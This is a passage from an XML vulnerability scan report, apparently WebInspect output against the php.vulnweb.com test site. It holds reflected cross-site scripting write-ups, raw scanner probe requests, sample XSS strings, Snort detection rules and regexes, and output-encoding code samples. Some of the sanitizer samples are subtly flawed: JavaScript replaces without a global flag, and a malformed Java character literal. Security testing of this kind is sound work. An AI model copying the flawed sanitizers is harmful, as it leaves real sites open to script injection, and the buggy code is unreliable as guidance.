</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="E2CC57F2AF8AF23E6F4F62DCAA389E69"><![CDATA[GET /pictures/8.jpg.tn/%32%38%32%37%33 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="E2CC57F2AF8AF23E6F4F62DCAA389E69";PSID="7836BF31381A834F702ACDA8226CFA98";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2532%2538%2532%2537%2533";AttackStringProps="Attack";tid="47";tt="40";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="fdc03c92";
X-Request-Memo: ID="27c30433";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3665
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/8.jpg.tn/28273");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:55:54</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="E2CC57F2AF8AF23E6F4F62DCAA389E69"><Method>GET</Method><Path>/pictures/8.jpg.tn/</Path><File>%32%38%32%37%33</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="E2CC57F2AF8AF23E6F4F62DCAA389E69";PSID="7836BF31381A834F702ACDA8226CFA98";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2532%2538%2532%2537%2533";AttackStringProps="Attack";tid="47";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="43";smi="0";sc="1";ID="fdc03c92";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="27c30433";sc="1";tid="47";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/8.jpg.tn/28273");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:55:54</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3665</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="78A4152ED11D0BCB23696D7E2DC168C7"><URL>http://php.vulnweb.com:80/pictures/7.jpg.tn/%38%32%34%36%37</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="9a519fbf-f73d-4d49-a401-0a4b22d696c7"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/7.jpg.tn/%38%32%34%36%37 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="78A4152ED11D0BCB23696D7E2DC168C7";PSID="E7330A41CFCDCC9DCB4118D50B7E9B45";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2538%2532%2534%2536%2537";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="9bb1421f";
X-Request-Memo: ID="ebf14663";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2000" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
